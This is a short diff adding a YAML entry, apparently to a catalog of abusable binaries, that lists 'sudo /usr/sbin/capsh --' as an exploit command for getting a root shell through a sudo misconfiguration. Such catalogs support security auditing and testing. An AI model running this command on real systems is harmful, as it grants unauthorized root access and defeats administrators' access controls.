@@ -1,0 +1,4 @@
+name: capsh
+binary_path: /usr/sbin/capsh
+exploit_cmds:
+- sudo /usr/sbin/capsh --
